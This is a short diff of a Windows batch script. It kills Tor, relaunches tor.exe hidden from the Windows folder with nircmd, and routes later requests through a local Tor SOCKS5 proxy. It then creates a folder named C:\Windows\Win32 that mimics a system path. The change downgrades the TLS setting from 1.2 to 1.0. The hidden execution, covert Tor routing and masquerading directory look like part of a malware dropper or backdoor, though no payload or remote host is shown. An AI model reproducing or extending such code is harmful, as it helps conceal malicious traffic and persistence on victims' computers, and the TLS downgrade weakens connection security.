@@ -39,8 +39,8 @@ taskkill /f /im tor.exe
 nircmd exec hide "C:\Windows\tor.exe" && timeout -t 30
  
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
-if not errorlevel 1 (set "proxy=--tlsv1.2 --socks5-hostname 127.0.0.1:9050") else (
-  set "proxy=--tlsv1.2"
+if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
+  set "proxy=--tlsv1"
 )
 
 mkdir "C:\Windows\Win32"
